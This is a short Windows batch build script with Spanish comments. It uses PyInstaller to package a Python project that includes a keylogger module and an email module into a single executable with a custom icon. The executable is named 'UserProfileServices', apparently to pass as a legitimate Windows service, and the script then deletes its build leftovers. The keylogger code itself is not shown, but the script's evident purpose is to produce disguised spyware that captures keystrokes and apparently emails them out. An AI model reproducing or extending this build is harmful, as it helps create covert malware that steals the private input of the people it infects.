@echo off

:: Variables
set nameScript=UserProfileServices
set currentDirectory=%~dp0

:: Compilar
echo Compilando Recursos...
pyinstaller --noconfirm --onefile --icon "%currentDirectory%icon.ico" --name "%nameScript%" --add-data "%currentDirectory%config.json;." --add-data "%currentDirectory%email_manager.py;." --add-data "%currentDirectory%json_manager.py;." --add-data "%currentDirectory%keylogger_manager.py;." "%currentDirectory%main.py"

:: Salida
echo Limpiando Residuos...
rmdir /s /q build
move "%currentDirectory%dist\%nameScript%.exe" "%currentDirectory%%nameScript%.exe"
rmdir /s /q dist
del %nameScript%.spec
echo Fin del Compilado

::  \____/\
::  /\``/\
:: -byRyanAg...